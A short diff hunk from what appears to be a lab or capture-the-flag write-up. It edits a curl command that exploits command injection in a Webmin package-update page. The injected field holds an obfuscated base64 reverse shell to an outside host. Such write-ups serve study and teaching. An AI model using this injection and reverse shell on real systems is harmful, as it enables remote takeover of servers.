@@ -350,7 +350,7 @@ curl -i -k -b 'testing=1' \
 curl -i -sS -k -X POST \
   -H 'Referer: https://10.10.10.160:10000/package-updates/update.cgi?xnavigation=1' \
   -H 'Content-Type: application/x-www-form-urlencoded' \
-  -b 'testing=1; sid=<SID>' \
+  -b 'sid=<SID>' \
   --data-binary $'u=acl/apt&u= | bash -c "{echo,YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC4xNC80NDQ0IDA%2BJjE%3D}|{base64,-d}|{bash,-i}"&ok_top=Update Selected Packages' \
   https://10.10.10.160:10000/package-updates/update.cgi
 ```
